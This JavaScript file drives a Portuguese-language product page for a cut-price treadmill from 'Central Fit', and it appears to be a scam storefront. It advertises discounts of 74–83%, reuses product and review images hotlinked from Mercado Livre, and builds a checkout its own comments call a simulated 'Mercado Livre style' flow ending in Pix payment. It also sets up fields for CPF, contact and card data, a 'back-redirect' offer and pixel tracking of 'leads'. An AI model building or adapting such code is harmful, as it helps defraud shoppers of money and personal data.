/* =========================================================
   Central Fit — PDP (Esteira WCT Fitness)
   Página única: nenhuma interação abre outra aba.
   ========================================================= */
(function () {
  'use strict';

  /* ------------------------- utilitários ------------------------- */
  const $ = (sel, ctx) => (ctx || document).querySelector(sel);
  const $$ = (sel, ctx) => Array.from((ctx || document).querySelectorAll(sel));
  const _ID_MAP = { cpf: 'fCpf', nome: 'fNome', email: 'fEmail', tel: 'fFone' };
  const el = id => document.getElementById(_ID_MAP[id] || id);
  const S = { payMethod: 'pix', cardData: null, step: 1 };

  const BRL = new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' });
  const money = n => BRL.format(n);

  /** "147,59" -> 'R$ 147,<sup>59</sup>' (centavos sobrescritos, com vírgula — padrão do layout) */
  const supPrice = txt => {
    const [int, dec = '00'] = String(txt).split(',');
    return `R$ ${int},<sup>${dec}</sup>`;
  };

  /** Escapa texto vindo do usuário antes de ir para innerHTML. */
  const esc = s => String(s).replace(/[&<>"']/g, c =>
    ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));

  const plural = n => `${n} unidade${n > 1 ? 's' : ''}`;

  let PRODUCT = "Esteira Elétrica Ergométrica Bivolt Ginastica WCT Fitness";

  const _im = (url, alt) => ({ thumb: url, full: url, zoom: url, w: 800, h: 800, zw: 1000, zh: 1000, type: 'img', alt });
  const _vid = (src, poster, alt) => ({ thumb: poster, poster: poster, src: src, w: 720, h: 1280, type: 'video', alt });

  const P = 'assets/products/';
  const PF = 'assets/reviews/shopee/';

  /* Galeria principal — Esteira WCT Fitness */
  const GAL_PRETO = [
    _im('https://http2.mlstatic.com/D_NQ_NP_679005-MLA100674509424_122025-O.webp', 'Esteira WCT Fitness — frente'),
    _im('https://http2.mlstatic.com/D_NQ_NP_804182-MLA100692751976_122025-O.webp', 'Esteira WCT Fitness — em uso'),
    _im('https://http2.mlstatic.com/D_NQ_NP_888266-MLA108193709801_032026-O.webp', 'Esteira WCT Fitness — detalhe'),
    _im('https://http2.mlstatic.com/D_NQ_NP_792192-MLA107473101458_032026-O.webp', 'Esteira WCT Fitness — display'),
    _im('https://http2.mlstatic.com/D_NQ_NP_875038-MLA108193679697_032026-O.webp', 'Esteira WCT Fitness — dobrada'),
    _im('https://http2.mlstatic.com/D_NQ_NP_990338-MLA108193829725_032026-O.webp', 'Esteira WCT Fitness — lateral'),
    _im('https://http2.mlstatic.com/D_NQ_NP_612153-MLA107472338108_032026-O.webp', 'Esteira WCT Fitness — em ambiente')
  ];

  /* Preto é a única cor disponível → galeria padrão. */
  const GALLERY = GAL_PRETO;
  let COLOR_GALLERIES = { 'Preto': GAL_PRETO };
  let activeGallery = GALLERY;

  const PHOTOS = GALLERY.filter(g => g.type === 'img');
  const photoIndex = (() => { let n = -1; return GALLERY.map(g => (g.type === 'img' ? ++n : -1)); })();

  /* Imagens dos cards relacionados / da loja — outras ferramentas Vonder */
  const REL_IMGS = [
    P + 'vonder-lavadora-lav1200.webp',          // 1
    P + 'vonder-lavadora-lav1600.webp',          // 2
    P + 'vonder-lavadora-lav2000.webp',          // 3
    P + 'vonder-lavadora-aspirador-combo.webp',  // 4
    P + 'vonder-kit-ferramentas-128.webp',       // 5
    P + 'vonder-kit-ferramentas-163.webp',       // 6
    P + 'vonder-esmerilhadeira-eav860.webp',     // 7
    P + 'vonder-inversor-solda-im125.webp',      // 8
    P + 'vonder-furadeira-pfv238i.webp',         // 9
    P + 'vonder-parafusadeira-pfv238.webp',      // 10
    P + 'vonder-esmerilhadeira-eav650.webp',     // 11
    P + 'vonder-serra-marmore-smv1300.webp',     // 12
    P + 'vonder-bico-snow-foam.webp',            // 13
    P + 'vonder-snow-foam-shampoo.webp',         // 14
    P + 'vonder-trena-5m.webp',                  // 15
    P + 'vonder-chave-allen.webp',               // 16
    P + 'vonder-chave-catraca.webp',             // 17
    'https://http2.mlstatic.com/D_NQ_NP_679005-MLA100674509424_122025-O.webp', // 18 — WCT Esteira (principal)
    'https://http2.mlstatic.com/D_NQ_NP_762973-MLA102379176322_122025-O.webp', // 19 — Dream Fitness DR2110
    'https://http2.mlstatic.com/D_NQ_NP_671064-MLA99847152475_112025-O.webp', // 20 — Energy 2.1
    'https://http2.mlstatic.com/D_NQ_NP_735261-MLA99524005004_122025-O.webp', // 21 — Energy 1600
    'https://http2.mlstatic.com/D_NQ_NP_862122-MLA109741238527_032026-O.webp', // 22 — Estação 80kg
    'https://http2.mlstatic.com/D_NQ_NP_966355-MLB116216627878_092026-O-esteira-eletrica-ergometrica-keepvital-12kmh-127220v-preto.webp', // 23 — Keepvital
    'https://http2.mlstatic.com/D_NQ_NP_874975-MLA103430021763_012026-O.webp', // 24 — Spinning WCT 13kg
    'https://http2.mlstatic.com/D_NQ_NP_888363-MLA112174121516_062026-O.webp', // 25 — Spinning Romantic Crown
    'https://http2.mlstatic.com/D_NQ_NP_922066-MLA117642490037_092026-O.webp', // 26 — Esteira 6km/h Dobrável
    'https://http2.mlstatic.com/D_NQ_NP_955068-MLA107832494564_032026-O-kit-completo-academia-fitness-profissional-4-pecas-preto.webp', // 27 — Kit Academia 4 Peças
    'https://http2.mlstatic.com/D_NQ_NP_864090-MLA95668516334_102025-O.webp', // 28 — Mini Bicicleta WCT Pedalinho
    'https://http2.mlstatic.com/D_NQ_NP_816113-MLA104275900297_012026-O.webp', // 29 — Spinning Redfin X11 6kg
    'https://http2.mlstatic.com/D_NQ_NP_939834-MLA116308309017_082026-O.webp', // 30 — Spinning Profissional 15kg
    'https://http2.mlstatic.com/D_NQ_NP_775996-MLA116732133503_082026-O.webp'  // 31 — Brus Fit Liftness X11
  ];

  /* Card do PRODUTO PRINCIPAL (LAV1300).
     Quando o lead navega para outro produto (?id=...), este card é injetado
     na PRIMEIRA posição dos carrosséis para trazer ele de volta pra oferta principal. */
  const MAIN_ID = '5';
  const MAIN_CARD = {
    img: 18, id: MAIN_ID,
    t: 'Esteira Elétrica Ergométrica Bivolt Ginastica WCT Fitness',
    p: '159,20', old: '699,00', off: '77% OFF', sold: '+10mil vendidos', pix: 1, ship: 1, full: 1
  };

  const RELATED = [
    { img: 19, id: 19, t: 'Esteira Elétrica Dream Fitness Ergométrica Bivolt DR2110 Preto', p: '199,20', old: '1.200,00', off: '83% OFF', sold: '+500 vendidos', pix: 1, ship: 1, full: 1 },
    { img: 20, id: 20, t: 'Esteira Elétrica Dream Fitness Ergométrica Ginástica Energy 2.1 Preto', p: '168,00', old: '890,00', off: '81% OFF', sold: '+70 vendidos', pix: 1, ship: 1, full: 1 },
    { img: 21, id: 21, t: 'Esteira Elétrica Dream Fitness Energy 1600 Dobrável Ergométrica Preto', p: '144,00', old: '690,00', off: '79% OFF', sold: '+600 vendidos', pix: 1, ship: 1, full: 1 },
    { img: 22, id: 22, t: 'Estação De Musculação Com 80kg Aparelho Ginástica Cinza/Preto', p: '168,00', old: '780,00', off: '78% OFF', sold: '+2k vendidos', pix: 1, ship: 1, full: 1 },
    { img: 23, id: 23, t: 'Esteira Elétrica Ergométrica Keepvital 12km/h 127/220v Preto', p: '128,00', old: '680,00', off: '81% OFF', sold: '+5 vendidos', pix: 1, ship: 1, full: 1 },
    { img: 24, id: 24, t: 'Bicicleta Spinning WCT Fitness Roda de Inércia 13kg Original Preto/Amarelo', p: '152,00', old: '800,00', off: '81% OFF', sold: '+10mil vendidos', pix: 1, ship: 1, full: 1 },
    { img: 25, id: 25, t: 'Bicicleta Spinning Romantic Crown Preto Roda Inércia 13kg', p: '96,00', old: '490,00', off: '80% OFF', sold: '+1k vendidos', pix: 1, ship: 1, full: 1 },
    { img: 26, id: 26, t: 'Esteira Elétrica 6km/h Dobrável Com Controle Remoto Display LED', p: '99,00', old: '380,00', off: '74% OFF', sold: '+200 vendidos', pix: 1, ship: 1, full: 1 },
    { img: 27, id: 27, t: 'Kit Completo Academia Fitness Profissional 4 Peças Preto', p: '88,00', old: '420,00', off: '79% OFF', sold: '+50 vendidos', pix: 1, ship: 1, full: 1 },
    { img: 28, id: 28, t: 'Mini Bicicleta Ergométrica Bike Pedalinho WCT Fitness', p: '48,00', old: '110,00', off: '56% OFF', sold: '+2k vendidos', pix: 1, ship: 1, full: 1 },
    { img: 29, id: 29, t: 'Bicicleta Spinning Redfin X11 Roda de Inércia 6kg Display LCD', p: '79,00', old: '380,00', off: '79% OFF', sold: '+800 vendidos', pix: 1, ship: 1, full: 1 },
    { img: 30, id: 30, t: 'Bicicleta Ergométrica Spinning Profissional Inércia 15kg App', p: '78,00', old: '380,00', off: '79% OFF', sold: '+1k vendidos', pix: 1, ship: 1, full: 1 },
    { img: 31, id: 31, t: 'Brus Fit Bicicleta Ergométrica Spinning Liftness X11 Preto/Vermelho', p: '80,00', old: '380,00', off: '79% OFF', sold: '+500 vendidos', pix: 1, ship: 1, full: 1 },
  ];
  const STORE = [
    { img: 24, id: 24, t: 'Bicicleta Spinning WCT Fitness Roda de Inércia 13kg Original', p: '152,00', old: '800,00', off: '81% OFF', sold: '+10mil vendidos', pix: 1, ship: 1, full: 1 },
    { img: 25, id: 25, t: 'Bicicleta Spinning Romantic Crown Preto Roda Inércia 13kg', p: '96,00', old: '490,00', off: '80% OFF', sold: '+1k vendidos', pix: 1, ship: 1, full: 1 },
    { img: 22, id: 22, t: 'Estação De Musculação Com 80kg Aparelho Ginástica Cinza/Preto', p: '168,00', old: '780,00', off: '78% OFF', sold: '+2k vendidos', pix: 1, ship: 1, full: 1 },
    { img: 27, id: 27, t: 'Kit Completo Academia Fitness Profissional 4 Peças Preto', p: '88,00', old: '420,00', off: '79% OFF', sold: '+50 vendidos', pix: 1, ship: 1, full: 1 },
    { img: 26, id: 26, t: 'Esteira Elétrica 6km/h Dobrável Com Controle Remoto Display LED', p: '99,00', old: '380,00', off: '74% OFF', sold: '+200 vendidos', pix: 1, ship: 1, full: 1 },
    { img: 21, id: 21, t: 'Esteira Elétrica Dream Fitness Energy 1600 Dobrável Ergométrica Preto', p: '144,00', old: '690,00', off: '79% OFF', sold: '+600 vendidos', pix: 1, ship: 1, full: 1 },
    { img: 23, id: 23, t: 'Esteira Elétrica Ergométrica Keepvital 12km/h 127/220v Preto', p: '128,00', old: '680,00', off: '81% OFF', sold: '+5 vendidos', pix: 1, ship: 1, full: 1 },
    { img: 20, id: 20, t: 'Esteira Elétrica Dream Fitness Energy 2.1 Ergométrica Preto', p: '168,00', old: '890,00', off: '81% OFF', sold: '+70 vendidos', pix: 1, ship: 1, full: 1 },
    { img: 28, id: 28, t: 'Mini Bicicleta Ergométrica Bike Pedalinho WCT Fitness', p: '48,00', old: '110,00', off: '56% OFF', sold: '+2k vendidos', pix: 1, ship: 1, full: 1 },
    { img: 29, id: 29, t: 'Bicicleta Spinning Redfin X11 Roda de Inércia 6kg Display LCD', p: '79,00', old: '380,00', off: '79% OFF', sold: '+800 vendidos', pix: 1, ship: 1, full: 1 },
    { img: 30, id: 30, t: 'Bicicleta Ergométrica Spinning Profissional Inércia 15kg App', p: '78,00', old: '380,00', off: '79% OFF', sold: '+1k vendidos', pix: 1, ship: 1, full: 1 },
    { img: 31, id: 31, t: 'Brus Fit Bicicleta Ergométrica Spinning Liftness X11 Preto/Vermelho', p: '80,00', old: '380,00', off: '79% OFF', sold: '+500 vendidos', pix: 1, ship: 1, full: 1 }
  ];
  const ASIDE = [
    { img: 21, id: 21, t: 'Esteira Elétrica Dream Fitness Energy 1600 Dobrável Ergométrica Preto', p: '144,00', old: '690,00', off: '79% OFF', sold: '+600 vendidos', pix: 1, ship: 1, full: 1 },
    { img: 22, id: 22, t: 'Estação De Musculação Com 80kg Aparelho Ginástica Cinza/Preto', p: '168,00', old: '780,00', off: '78% OFF', sold: '+2k vendidos', pix: 1, ship: 1, full: 1 },
    { img: 24, id: 24, t: 'Bicicleta Spinning WCT Fitness Roda de Inércia 13kg Original', p: '152,00', old: '800,00', off: '81% OFF', sold: '+10mil vendidos', pix: 1, ship: 1, full: 1 },
    { img: 25, id: 25, t: 'Bicicleta Spinning Romantic Crown Preto Roda Inércia 13kg', p: '96,00', old: '490,00', off: '80% OFF', sold: '+1k vendidos', pix: 1, ship: 1, full: 1 },
    { img: 28, id: 28, t: 'Mini Bicicleta Ergométrica Bike Pedalinho WCT Fitness', p: '48,00', old: '110,00', off: '56% OFF', sold: '+2k vendidos', pix: 1, ship: 1, full: 1 },
    { img: 29, id: 29, t: 'Bicicleta Spinning Redfin X11 Roda de Inércia 6kg Display LCD', p: '79,00', old: '380,00', off: '79% OFF', sold: '+800 vendidos', pix: 1, ship: 1, full: 1 },
    { img: 30, id: 30, t: 'Bicicleta Ergométrica Spinning Profissional Inércia 15kg App', p: '78,00', old: '380,00', off: '79% OFF', sold: '+1k vendidos', pix: 1, ship: 1, full: 1 },
    { img: 31, id: 31, t: 'Brus Fit Bicicleta Ergométrica Spinning Liftness X11 Preto/Vermelho', p: '80,00', old: '380,00', off: '79% OFF', sold: '+500 vendidos', pix: 1, ship: 1, full: 1 }
  ];

  /* Avaliações — cada comentário com sua própria mídia (imagens/vídeos), sem repetir. */
  const RV  = 'assets/reviews/';
  const RVS = 'assets/reviews/shopee/';
  const _ri = src => ({ type: 'img', src, thumb: src, w: 800, h: 800 });
  const _rv = (src, poster, dur) => ({ type: 'video', src, poster, thumb: poster, dur });

  let REVIEWS = [
    { rate: 5, name: 'Fernanda C.', country: 'Brasil', when: 'Há 1 ano', ageDays: 365, likes: 426,
      text: 'Estou usando a esteira desde julho de 24, estamos em fevereiro de 25 e ela segue firme e forte. Uso todo dia pra correr por pelo menos 1h e ela nunca deu nenhum tipo de problema. Tem que manter lubrificada direitinho, mas fora isso é uma mão na roda aqui em casa.',
      media: [ _ri('https://http2.mlstatic.com/D_NQ_NP_750304-MLA82370786589_022025-O.webp') ] },
    { rate: 5, name: 'Juliana M.', country: 'Brasil', when: 'Há 1 ano', ageDays: 380, likes: 240,
      text: 'Estou gostando bastante, ainda não tive nenhum problema (graças a deus), faz 14 dias q estou usando. Eu, minha filha e meu marido usamos todos os dias. A montagem foi simples e ela é bem silenciosa. Super recomendo!',
      media: [ _ri('https://http2.mlstatic.com/D_NQ_NP_697583-MLA85063017082_052025-O.webp') ] },
    { rate: 5, name: 'Carlos A.', country: 'Brasil', when: 'Há 1 ano', ageDays: 400, likes: 164,
      text: '2º produto desta marca. Perfeito. Com relação a voltagem bivolt o pino fica em baixo. Já vem com o lubrificante perfeito. Montagem simples. Silenciosa. Gostei nota 10.',
      media: [
        _ri('https://http2.mlstatic.com/D_NQ_NP_743609-MLA86615057239_062025-O.webp'),
        _ri('https://http2.mlstatic.com/D_NQ_NP_625506-MLA86296871694_062025-O.webp'),
        _ri('https://http2.mlstatic.com/D_NQ_NP_945125-MLA86615017669_062025-O.webp'),
        _ri('https://http2.mlstatic.com/D_NQ_NP_738592-MLA86615086479_062025-O.webp'),
        _ri('https://http2.mlstatic.com/D_NQ_NP_939059-MLA86615076683_062025-O.webp')
      ] },
    { rate: 5, name: 'Ricardo B.', country: 'Brasil', when: 'Há mais de 1 ano', ageDays: 450, likes: 200,
      text: 'Apenas uma colocação — falta a informação de voltagem mais clara, mas a esteira em si é excelente. Silenciosa, firme, e a correia é muito boa. Uso todo dia sem problema.' },
    { rate: 5, name: 'Patrícia L.', country: 'Brasil', when: 'Há 6 meses', ageDays: 180, likes: 321,
      text: 'Amei a minha compra, chegou super rápido e o produto é exatamente como na descrição. Já uso todo dia há meses e ela continua igual a do primeiro dia. Super recomendo!',
      media: [
        _ri('https://http2.mlstatic.com/D_NQ_NP_602603-MLA84578606281_052025-O.webp'),
        _ri('https://http2.mlstatic.com/D_NQ_NP_920624-MLA76517382909_052024-O.webp')
      ] },
    { rate: 5, name: 'Mariana S.', country: 'Brasil', when: 'Há 4 meses', ageDays: 120, likes: 418,
      text: 'Esteira elétrica excelente! Uso todo dia essa semana, aguentou tranquilo meus 90kg sem nenhuma vibração. Suave, silenciosa, display fácil de ver. Recomendo demais!' },
    { rate: 5, name: 'Rafael T.', country: 'Brasil', when: 'Há 3 meses', ageDays: 90, likes: 336,
      text: 'Comprei de presente pra minha esposa e ela amou. Veio bem embalada, sem nenhum amassado. A correia é larga e confortável, o painel é intuitivo. Vale cada centavo.' },
    { rate: 5, name: 'Larissa P.', country: 'Brasil', when: 'Há 2 meses', ageDays: 60, likes: 479,
      text: 'Estava com o pé atrás por causa do preço, mas me surpreendeu MUITO. Já usei mais de 20 vezes e continua novinha, sem barulho nenhum. A WCT Fitness superou todas as minhas expectativas!' },
    { rate: 4, name: 'Bruno O.', country: 'Brasil', when: 'Há 1 mês', ageDays: 30, likes: 143,
      text: 'Boa velocidade, compacta e dobrável. Só achei a montagem um pouco demorada, mas o manual ajuda bastante. No geral estou satisfeito e a esteira funciona muito bem.' }
  ];

  // Lista plana de toda a mídia (na ordem dos comentários) para a faixa "Opiniões com fotos".
  let REVIEW_MEDIA = REVIEWS.reduce((a, r) => a.concat(r.media || []), []);

  const BARS = [
    { star: 5, pct: 88 }, { star: 4, pct: 8 }, { star: 3, pct: 2 }, { star: 2, pct: 1 }, { star: 1, pct: 1 }
  ];

  const SUGGESTIONS = [
    'lavadora alta pressão vonder', 'vonder lav1300', 'lavadora 1200w',
    'lava jato doméstico', 'lavadora compacta', 'kit lavadora vonder', 'esmerilhadeira vonder'
  ];

  const icon = (id, cls) => `<svg${cls ? ` class="${cls}"` : ''} aria-hidden="true" focusable="false"><use href="#${id}"/></svg>`;
  const star = on => `<svg${on ? '' : ' class="off"'} aria-hidden="true" focusable="false"><use href="#i-star"/></svg>`;

  /* ============================ TOAST ============================ */
  const toastEl = $('#toast');
  const toastMsg = $('#toastMsg');
  let toastTimer;
  function toast(msg) {
    toastMsg.textContent = msg;
    toastEl.classList.add('is-open');
    clearTimeout(toastTimer);
    toastTimer = setTimeout(() => toastEl.classList.remove('is-open'), 3400);
  }

  /* ============================ GALERIA ============================ */
  const thumbsEl = $('#thumbs');
  const stage = $('#stage');
  let gi = 0;
  let zoomArmed = false;   // a imagem 2x só é baixada no primeiro hover

  thumbsEl.innerHTML = activeGallery.map((g, i) => `
    <button class="thumb${i === 0 ? ' is-active' : ''}" type="button" data-i="${i}"
            aria-current="${i === 0}" aria-label="Ver imagem ${i + 1} de ${GALLERY.length}">
      <img src="${g.thumb}" width="112" height="112" decoding="async" alt="">
      ${g.type === 'video' ? `<span class="thumb__play">${icon('i-play')}</span>` : ''}
    </button>`).join('');

  $$('.thumb', thumbsEl).forEach(btn => {
    const go = () => setGallery(Number(btn.dataset.i));
    btn.addEventListener('mouseenter', go);
    btn.addEventListener('click', go);
    btn.addEventListener('focus', go);
  });

  function setGallery(i) {
    gi = (i + activeGallery.length) % activeGallery.length;
    const g = activeGallery[gi];

    $$('.thumb', thumbsEl).forEach((t, k) => {
      t.classList.toggle('is-active', k === gi);
      t.setAttribute('aria-current', String(k === gi));
    });

    if (g.type === 'video') {
      // pôster primeiro: o vídeo só é baixado quando a pessoa aperta play
      stage.innerHTML = `
        <div class="stage__video">
          <img src="${g.poster}" width="${g.w}" height="${g.h}" decoding="async" alt="${esc(g.alt)}">
          <button type="button" aria-label="Reproduzir vídeo do produto">${icon('i-play')}</button>
        </div>`;
      stage.classList.remove('is-zoom');
      $('button', stage).addEventListener('click', e => {
        e.stopPropagation();
        playVideo(g);
      });
    } else {
      stage.innerHTML = `
        <img id="stageImg" src="${g.full}" srcset="${g.full} ${g.w}w, ${g.zoom} ${g.zw}w"
             sizes="(max-width:899px) 92vw, 358px"
             width="${g.w}" height="${g.h}" decoding="async" alt="${esc(g.alt)}">
        <span class="stage__lens" id="lens" aria-hidden="true"></span>`;
      zoomArmed = false;
      armZoom();
    }
  }

  /** Troca o pôster pelo player e começa a tocar. Usa hls.js para HLS, nativo para mp4. */
  function playVideo(g) {
    stage.innerHTML = `
      <div class="stage__video">
        <video id="stageVid" poster="${g.poster}" width="${g.w}" height="${g.h}"
               controls autoplay playsinline preload="auto"></video>
      </div>`;
    const video = $('#stageVid', stage);
    const src = g.src;
    if (src.includes('.m3u8') && typeof Hls !== 'undefined' && Hls.isSupported()) {
      const hls = new Hls({ enableWorker: false });
      hls.loadSource(src);
      hls.attachMedia(video);
      hls.on(Hls.Events.MANIFEST_PARSED, () => video.play().catch(() => {}));
      hls.on(Hls.Events.ERROR, (_, d) => { if (d.fatal) toast('Não foi possível carregar o vídeo.'); });
    } else if (video.canPlayType('application/vnd.apple.mpegurl')) {
      video.src = src;
      video.play().catch(() => {});
    } else {
      video.src = src;
    }
    video.addEventListener('click', e => e.stopPropagation());
  }

  /** Aplica a imagem 2x como background da lente (uma vez por imagem). */
  function armZoom() {
    if (zoomArmed) return;
    const lens = $('#lens');
    if (!lens) return;
    lens.style.backgroundImage = `url("${(activeGallery[gi] || GALLERY[gi]).zoom}")`;
    zoomArmed = true;
  }

  /* listeners de zoom registrados uma única vez — o palco persiste, o conteúdo troca */
  stage.addEventListener('mouseenter', () => {
    if (!$('#lens')) return;
    armZoom();
    stage.classList.add('is-zoom');
  });
  stage.addEventListener('mouseleave', () => stage.classList.remove('is-zoom'));
  stage.addEventListener('mousemove', e => {
    const lens = $('#lens');
    if (!lens) return;
    const r = stage.getBoundingClientRect();
    const x = ((e.clientX - r.left) / r.width) * 100;
    const y = ((e.clientY - r.top) / r.height) * 100;
    lens.style.backgroundPosition = `${x}% ${y}%`;
  });
  stage.addEventListener('click', () => {
    const activePhotos = activeGallery.filter(g => g.type === 'img');
    const idx = activePhotos.indexOf(activeGallery[gi]);
    if (idx >= 0) openLightbox(idx, activePhotos.map(p => ({ src: p.zoom, thumb: p.thumb, alt: p.alt, w: p.zw, h: p.zh })));
  });

  $('#galPrev').addEventListener('click', () => setGallery(gi - 1));
  $('#galNext').addEventListener('click', () => setGallery(gi + 1));

  /* ============================ MODAIS ============================ */
  const FOCUSABLE = 'a[href],button:not([disabled]),input:not([disabled]),select,textarea,[tabindex]:not([tabindex="-1"])';
  let lastFocused = null;

  function openModal(el) {
    lastFocused = document.activeElement;
    el.hidden = false;
    document.body.style.overflow = 'hidden';
    const first = $(FOCUSABLE, el);
    if (first) first.focus();
  }
  function closeModals() {
    let changed = false;
    $$('.modal').forEach(m => {
      if (!m.hidden) { m.hidden = true; changed = true; }
    });
    if (!changed) return;
    try { const _v = document.getElementById('lbVideo'); if (_v) { _v.pause(); } } catch (_) {}
    document.body.style.overflow = '';
    if (lastFocused && document.contains(lastFocused)) lastFocused.focus();
    lastFocused = null;
  }
  function openModalEl() { return $$('.modal').find(m => !m.hidden) || null; }

  $$('.modal').forEach(m => {
    m.addEventListener('mousedown', e => { if (e.target === m) closeModals(); });
    $$('[data-close]', m).forEach(b => b.addEventListener('click', closeModals));
  });

  /* ---------- Lightbox ---------- */
  const lb = $('#lightbox');
  const lbImg = $('#lbImg');
  const lbVideo = $('#lbVideo');
  const lbThumbs = $('#lbThumbs');
  let lbi = 0;
  let lbSet = [];

  function openLightbox(index, set) {
    lbSet = set;
    lbi = Math.max(0, Math.min(index, lbSet.length - 1));
    lbThumbs.innerHTML = lbSet.map((g, k) => `
      <button class="thumb${g.type === 'video' ? ' thumb--video' : ''}" type="button" data-i="${k}" aria-current="${k === lbi}" aria-label="${g.type === 'video' ? 'Vídeo' : 'Imagem'} ${k + 1}">
        <img src="${g.thumb}" width="112" height="112" loading="lazy" decoding="async" alt="">
        ${g.type === 'video' ? `<span class="thumb__play">${icon('i-play')}</span>` : ''}
      </button>`).join('');
    $$('.thumb', lbThumbs).forEach(b => b.addEventListener('click', () => lbGo(Number(b.dataset.i))));
    const single = lbSet.length < 2;
    $('#lbPrev').hidden = single;
    $('#lbNext').hidden = single;
    lbThumbs.hidden = single;
    lbGo(lbi);
    openModal(lb);
  }

  function lbGo(i) {
    lbi = (i + lbSet.length) % lbSet.length;
    const item = lbSet[lbi];
    if (item.type === 'video') {
      lbImg.hidden = true;
      lbVideo.hidden = false;
      if (item.poster) lbVideo.poster = item.poster;
      if (lbVideo.getAttribute('src') !== item.src) lbVideo.src = item.src;
      lbVideo.play().catch(() => {});
    } else {
      lbVideo.pause();
      lbVideo.hidden = true;
      lbImg.hidden = false;
      lbImg.src = item.src;
      lbImg.alt = item.alt || '';
      if (item.w) { lbImg.width = item.w; lbImg.height = item.h; }
    }
    $$('.thumb', lbThumbs).forEach((t, k) => {
      t.classList.toggle('is-active', k === lbi);
      t.setAttribute('aria-current', String(k === lbi));
    });
  }
  $('#lbPrev').addEventListener('click', () => lbGo(lbi - 1));
  $('#lbNext').addEventListener('click', () => lbGo(lbi + 1));

  /* ---------- teclado global dos modais ---------- */
  document.addEventListener('keydown', e => {
    const modal = openModalEl();

    if (e.key === 'Escape') {
      if (modal) { closeModals(); return; }
      const openDrop = $$('.dropdown.is-open, .qty__menu.is-open, .suggest.is-open')[0];
      if (openDrop) closeAllMenus();
      return;
    }
    if (!modal) return;

    if (modal === lb) {
      if (e.key === 'ArrowLeft') { e.preventDefault(); lbGo(lbi - 1); return; }
      if (e.key === 'ArrowRight') { e.preventDefault(); lbGo(lbi + 1); return; }
    }
    if (e.key === 'Tab') {                       // trava o foco dentro do modal
      const items = $$(FOCUSABLE, modal).filter(el => el.offsetParent !== null);
      if (!items.length) return;
      const first = items[0], last = items[items.length - 1];
      if (e.shiftKey && document.activeElement === first) { e.preventDefault(); last.focus(); }
      else if (!e.shiftKey && document.activeElement === last) { e.preventDefault(); first.focus(); }
    }
  });

  /* ==================== FAVORITO / SEGUIR / LISTA ==================== */
  $('#favBtn').addEventListener('click', function () {
    const on = this.getAttribute('aria-pressed') !== 'true';
    this.setAttribute('aria-pressed', String(on));
    this.setAttribute('aria-label', on ? 'Remover dos favoritos' : 'Adicionar aos favoritos');
    toast(on ? 'Produto adicionado aos favoritos.' : 'Produto removido dos favoritos.');
  });

  $('#followBtn').addEventListener('click', function () {
    const on = this.getAttribute('aria-pressed') !== 'true';
    this.setAttribute('aria-pressed', String(on));
    this.textContent = on ? 'Seguindo' : 'Seguir';
    toast(on ? 'Agora você segue a loja Central Fit.' : 'Você deixou de seguir a loja.');
  });

  $('#listBtn').addEventListener('click', e => {
    e.preventDefault();
    toast('Produto adicionado à sua lista.');
  });

  /* ---------- Quantidade ---------- */
  const MAX_QTY = 12;
  let qty = 1;
  const qtyBtn = $('#qtyBtn');
  const qtyMenu = $('#qtyMenu');
  const qtyLabel = $('#qtyLabel');

  qtyMenu.innerHTML = Array.from({ length: MAX_QTY }, (_, k) => {
    const n = k + 1;
    return `<li role="option" tabindex="-1" data-q="${n}" aria-selected="${n === 1}">${plural(n)}</li>`;
  }).join('');

  function setQty(n) {
    qty = Math.min(Math.max(n, 1), MAX_QTY);
    qtyLabel.textContent = plural(qty);
    $$('li', qtyMenu).forEach(li => li.setAttribute('aria-selected', String(Number(li.dataset.q) === qty)));
    updateCheckout();
  }

  qtyBtn.addEventListener('click', e => {
    e.stopPropagation();
    const open = !qtyMenu.classList.contains('is-open');
    closeAllMenus();
    qtyMenu.classList.toggle('is-open', open);
    qtyBtn.setAttribute('aria-expanded', String(open));
    if (open) $(`li[aria-selected="true"]`, qtyMenu)?.focus();
  });
  qtyMenu.addEventListener('click', e => {
    const li = e.target.closest('li');
    if (!li) return;
    setQty(Number(li.dataset.q));
    closeAllMenus();
    qtyBtn.focus();
  });
  listboxKeys(qtyMenu, qtyBtn, li => { setQty(Number(li.dataset.q)); });

  /* ---------- Carrinho ---------- */
  let cart = 2;
  let extraItems = []; // itens de produtos relacionados adicionados ao carrinho

  function extraTotal() {
    return extraItems.reduce((s, i) => s + i.price * i.qty, 0);
  }

  function renderCartItems() {
    const el = $('#cartItemsList');
    if (!el) return;
    if (!extraItems.length) { el.innerHTML = ''; return; }
    el.innerHTML = extraItems.map(i => {
      const label = i.title.length > 38 ? i.title.slice(0, 38) + '…' : i.title;
      const qtyTxt = i.qty > 1 ? ` (${i.qty}x)` : '';
      const priceTxt = i.price > 0 ? money(i.price * i.qty) : '<span class="co-free">Grátis</span>';
      const imgTag = i.img
        ? `<img src="${esc(i.img)}" alt="" style="width:24px;height:24px;object-fit:cover;border-radius:4px;margin-right:6px;vertical-align:middle;display:inline-block">`
        : '';
      return `<p class="co-line co-line--extra"><span>${imgTag}${esc(label)}${esc(qtyTxt)}</span><span>${priceTxt}</span></p>`;
    }).join('');
  }
  $('#addCart').addEventListener('click', () => {
    cart += qty;
    $('#cartCount').textContent = String(cart);
    $('#cartBtn').setAttribute('aria-label', `Carrinho com ${cart} produtos`);
    toast(`Adicionado ao carrinho: ${plural(qty)}.`);
  });
  $('#cartBtn').addEventListener('click', () => toast(`Você tem ${cart} produtos no carrinho.`));

  /* ============================================================
     Checkout estilo Mercado Livre — fluxo em etapas (simulado)
     Etapas: 1) Endereço + entrega  2) Pagamento  3) Revisão → Pix
     ============================================================ */
  /* Oferta de back-redirect: quando ativa, o "preço unitário" passa a ser o
     do combo (2× por R$ 79,90 → R$ 39,95/un) em vez do preço da buy-opt. */
  let backOffer = null;                                 // { unit: 39.95, qty: 2 } quando ativa
  const unitPrice = () => backOffer ? backOffer.unit : Number($('.buy-opt.is-sel').dataset.pix);
  let OLD_UNIT = 699.00;                              // preço "cheio" p/ calcular economia
  const cho = $('#checkout');
  const steps = $$('.step', cho);
  const doneView = $('#choDone');
  let current = 1;                                      // etapa ativa
  let payMethod = 'pix';

  const PAY_LABEL = { pix: 'Pix', card: 'Cartão de crédito' };
  // build: v16

  /* Pixel Meta (fbq) — eventos client-side, deduplicados com o CAPI via eventID */
  let PRODUCT_ID = 'WCT_ESTEIRA_2HP';
  /* Os eventos são disparados apenas no canal que trouxe a visita — ver a
